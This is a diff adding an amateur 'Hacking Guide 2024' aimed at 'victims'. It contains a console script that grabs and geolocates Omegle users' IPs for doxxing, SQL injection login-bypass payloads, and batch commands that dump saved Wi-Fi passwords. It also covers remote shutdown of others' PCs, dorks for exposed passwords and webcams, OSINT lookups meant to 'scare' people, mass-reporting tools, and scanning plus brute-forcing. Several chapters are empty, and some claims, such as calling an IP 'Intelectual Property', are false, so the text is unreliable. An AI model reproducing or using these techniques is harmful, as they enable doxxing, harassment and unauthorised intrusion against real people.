@@ -1,0 +1,360 @@
+Hacking Guide 2024 (Deluxe Edition)
+
+Hello, and welcome to the ultimate hacking guide you will ever need! This guide will be updated, and includes many different ways you could get your hands
+on the newest ways to hack people, websites, files, systems, etc. Keep in mind that I am NOT responsible for any damages done to anyone or anything
+if these techniques are executed. 
+
+
+
+
+Chapter 1: IP Address Grabbing
+
+Description:
+
+An IP, also known as Intelectual Property, is a term used in hacking, and the tech community, which are numbers, including dots in between showing the location
+of your device, in a number format. This code can be used for malicious purposes such as DOXXING, DDOSING. More on that later. Some IP addressescan be 
+entered into a website or service to show the location of the address on a map, ultimately finding your location. VPNs are "Virtual Private Networks" which hide
+your IP address, generating a random IP, masking your actual location, hackers of careful users use VPNs for maximum security.
+
+VPN Recomendations for Hackers, Daily Users:
+
+- Tunnel Bear
+- Nord VPN
+- Surfshark
+- Atlas VPN
+- AVG Secure VPN (I use)
+
+=====================================================================================================================================
+
+A few ways to do it:
+
+1. Generating Grabify links, sending it to the victim, trying to manipulate them to click it, knowing there location, DOXX them.
+
+2. Omegle IP Grabbing Script for the omegle site, use a VPN to mask yours.
+
+Detailed Tutorial: 
+
+1. Go on omegle
+2. Right click, and select inspect
+3. go to console window
+4. paste code, start trolling
+
+Script (Java, JS)
+
+window.oRTCPeerConnection =
+  window.oRTCPeerConnection || window.RTCPeerConnection;
+
+window.RTCPeerConnection = function (...args) {
+  const pc = new window.oRTCPeerConnection(...args);
+
+  pc.oaddIceCandidate = pc.addIceCandidate;
+
+  pc.addIceCandidate = function (iceCandidate, ...rest) {
+    const fields = iceCandidate.candidate.split(" ");
+
+    console.log(iceCandidate.candidate);
+    const ip = fields[4];
+    if (fields[7] === "srflx") {
+      getLocation(ip);
+    }
+    return pc.oaddIceCandidate(iceCandidate, ...rest);
+  };
+  return pc;
+};
+
+let getLocation = async (ip) => {
+  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
+
+  await fetch(url).then((response) =>
+    response.json().then((json) => {
+      const output = `
+          ---------------------
+          Country: ${json.country_name}
+          State: ${json.state_prov}
+          City: ${json.city}
+          District: ${json.district}
+          Lat / Long: (${json.latitude}, ${json.longitude})
+          ---------------------
+          `;
+      console.log(output);
+    })
+  );
+};
+
+
+
+Chapter 2: Wi-Fi Hijacking
+
+1. Wi-Fi Spoofing
+	Making your own unsecure network from laptop with antenna if theres a network with no password
+3. Hacking victim with there IP, to trick the computer to use HTTP instead of HTTPS, to have 
+	unencrypted data to myself, then send it back to router to not cause irregularities.
+
+
+
+Chapter 3: Flipper Zero Hacks
+
+Install, and learn ducky script (in pws) to put to badUSB flipper folder, connect to victims computer, execute the  
+
+Chapter 4: SQL Injections to websites login screens which are unsecure:
+
+Username: admin' OR '1'='1
+Password: password123
+
+- if username is correct, the database is SQL for the website login, add OR '1'='1 because the entered strings change
+	and this can alter the code to check if 1 = 1, which it is, bypassing the password, and entering the account,
+	to do whatever you want with it, only if the website is unsecured, and/or uses old or outdated protocols
+
+- if you do not know the username of the victim, try to bypass the SQL code system database with this trick: 
+	in SQL, --  adds a comment, not proccessing anything on that line, after "-- ", which means if the strings updated in the code itself,
+	it escapes the code, and ultimately commenting the password section,	
+
+Username: admin'--
+Password = dosent_matter_lol
+
+
+Chapter 5: Phone Number Info
+
+1. Login to google cloud, click the terminal icon to open it.
+2. Visit: https://github.com/sundowndev/PhoneInfoga
+3. Scroll down to README.md, click "Documentation"
+4. Scroll down to Using Docker, and copy this: docker pull sundowndev/PhoneInfoga:latest
+5. Paste to Google cloud console, when done, type: "docker run -it sundowndev/phoneinfoga scan -n theirphonenumberwithcountrycodeatstartandalltogether"
+6. Look at the exact location, line type, and more info in the shell, enjoy! Scare them with the info you grabbed!
+7. GUI - type: docker run -it -p 8080:8080 sundowndev/phoneinfoga serve -p 8080, and hit enter
+8. Click icon, choose open port 8080, and now the phone info can be viewed in GUI format, and lots more advanced private info, on a web ip to make it easier for the eyes.
+9. Thank me and NetworkChuck later!
+
+Chapter 6: DDOSING/DOXXING/DOSSING
+
+Method 1: Watch David Bombal's video
+
+Method 2:
+
+
+Chapter 7: Powershell, and CMD Hacks/Shortcuts
+
+CMD TRICKS:
+
+1. Encrypt folder your in:cipher /E
+2. Change text color:type color 'numbers 1-10 and letters a to whatever'
+3. List Directories, info:dir /s
+4. Open folder, make it invisible for anyone, to reverse do same thing but with minusses for all letters:attrib +h +s +r nameoffolder
+5. Show every wifi network you have ever connected to on device, with info, password:netsh wlan show profile "SeaButterfly" key=clear
+6. list every wifi name,pass on a txt, first type: C:\Users\user\Desktop>for /f "skip=9 tokens-1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") >> wifipasswords.txt
+7. list every wifi, pass, info on a batch file, type:
+
+@echo off
+setlocal enabledelaydexpansion
+
+for /F "tokens-2 delims=:" %%a in ('netsh wlan show profile') do (
+	set wifi_pwd=
+	for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
+		set wifi_pwd=%%F
+	)
+	echo %%a : !wifi_pwd!
+)
+
+# and save as .bat, now run it to be in a shell!
+
+8. all system info, type:systeminfo
+9. How to copy a file securely to a server, type:scp file_name.idk root@ip_goes_here:~/file_name.idk
+10. typing cmd when opened a directory in the address bar will open the directory's name in cmd, reverseable.
+11. Mount folder on system as a mounted drive, type:
+12.
+13.
+14.
+15.
+16.
+17.
+18.
+19.
+20.
+
+
+Chapter 8: Custom made keyboard virus for victim (keyboard tricks)
+Chapter 9: Messing with BIOS/EUFI
+Chapter 10: Find Social Media
+
+1. Go to: https://github.com/sherlock-project/sherlock
+2. Scroll down to "Open in Google Cloud Shell"
+3. Make an account with your e-mail
+4. Go back to github repo, copy: "python3 -m pip install -r requirements.txt"
+5. Paste into google cloud terminal, press Enter
+6. Find a username for someone's social media
+7. type: python3 sherlock --timeout 1 their_name   ,press Enter
+8. It will find all social media platforms containing the username, similar ones to help find the legit one.
+
+
+Chapter 11: Mass Report Social Media Accounts/ Make them banned
+
+Mobile: 
+
+PC: 
+
+
+Chapter 12: Remotely shut down/restart someone's computer, with their IP:
+
+1. Have Windows 10 Pro Installed
+2. Open CMD, type: shutdown -i
+3. Click Add, and paste the IP address
+4. Now, add a custom message, or reason why this happened, and how long until the attack will take place.
+5. Boom the user is now booted off their computer.
+
+
+Chapter 13: Hack, and view open web ports of random webcams on google:
+
+1. on google, type    intitle:"webcamXP 5" and start looking at wrongly configured open ports of webcams
+2. on google, type    inurl: 'webcam xp5'
+3. Search up a special CCTV camera hacking video if needed for later uses on YT ofc.
+
+Chapter 14: Browser hacking:
+
+1. Installing Kali Linux
+2. Find Victim
+3. Create a folder called :Applications"
+4. Open shell, type "ls"
+5. cd Applications/
+6. Open Firefox, go to google.com
+7. type beEF framework, click git beefproject repo
+8. sudo git clone https://github.com/beefproject/beef.git
+9. enter password for kali
+10. ls
+11. cd beef/
+12. ./install
+13. Y, enter
+14. Enter
+15. if u get error, type "sudo ./install"
+16. sudo ./beef
+17. ls
+18. sudo nano config.yaml, eneter
+19. Change User, and Password
+20. Ctrl O, enter, ctrl x to exit
+21. sudo su
+22. ./beef, enter
+23. loading packages, copy the UI URL, open firefox, paste, login with user and password for beEF
+24. learn beef attacks, basic guide down below! Enjoy!
+
+How to use beEF:
+
+1. 
+2.
+3.
+4.
+5.
+6.
+7.
+8.
+9.
+10.
+
+
+
+Chapter 15: Google Dorking:
+
+What is it? Google dorking is what it sounds like, and it is the practice of a user, or sorry, a google dork, typing very specific searches, some of which may reveal some
+sensitive user data, and log files, and other data which is almost impossible to find by searching things up casually, here are some useful ways, that leaked user info can be seen
+
+1. allintext:username filetype:log, enter the word searcher, type usernames or password when on these ports
+2. intitle:"index of" inurl:ftp, enter to see ftp server old cache data 
+3. db_password filetype:en, enter to view a bunch of old usernames, passwords ready to be stolen
+4. filetype:inc php -site:github.com -site:sourceforge.net, enter to see unprotected php variables, and github code
+5. filetype:php "Notice: Undefined variable: data in" -forum, and enter to see php variables of different domains, and ports.
+6. intitle:"WAMPSERVER homepage" "Server Configuration" "Apache Version"  , and enter to view server config ui, and logs
+7. intitle:"report" ("qualys" | "acunetix" | "nessus" | "netsparker" | "nmap") filetype:pdf           , and enter to find bank reports, and pdfs for banks
+
+
+Chapter 16: Autoreporting (Tiktok Videos)
+
+Autoreporting is the practice of sending multiple reports at once, to a certain user, or video. This tutorial is outdated, but can be useful, welcome to Rebomb2
+follow the steps to make sure the videos you hate, and should not be on the platform are deleted, from these reports! Newest rebomb2 tut needs win11 for now.
+
+1. Download Rebomb2: https://github.com/Sadyyn/ReBomb2
+
+2. Select "Code" and then "Download ZIP"
+
+3. After the files are downloaded, extract them, with an extraction tool like WinRAR, or 7Zip
+
+4. Find the victim's video (Tiktok Web Version)
+
+5. Right click, and select "Inspect Element"
+
+6. Go to the "Network" tab
+
+7. Press the Crossed out icon, to clear latest network activity
+
+8. Pause it, report them for something that makes sense.
+
+9. Under the network tab, something that has a question mark at the start, open it, and copy the full report request URL
+
+10. Paste the URL into your search bar, hit Enter
+
+11. Now, copy the URL again, once on the source page
+
+12. Go back to the video, with inspect element, open "ReBomb2.exe"
+
+13. Once it is running, paste the newest URL into the input box of the program, and wait until "Reported :D" appears, defining how many reports were sent
+
+
+Chapter17: Grabbing IPS (Local, Public)
+
+1. Go to:   angryip.org
+2. download the installer for your OS
+3. Complete the setup, run
+4. Red = offline ports, Green = active ports available, Blue: active but no ports available
+5. right click on an ip, go to open, choose web browser to see what the port is open on.
+6. PORT SELECTION:
+
+- 21 - FTP
+- 22 - SSH
+- 23 - TelNet
+- 80 - HTTP
+- 445 - SMB
+- 3389 - RDP
+- 5900 - VNC
+
+7. Right click on a green ip, choose open, windows shares to see ip's users files (only for 445 ports)
+8. Run ping tests to check ping
+9. Go to nirsoft.net   and find your wanted country's ip range
+10. copy, paste the 1st,2nd local, public ips into angry ip scanner, start
+11. get a bruteforcer and crack these ports
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
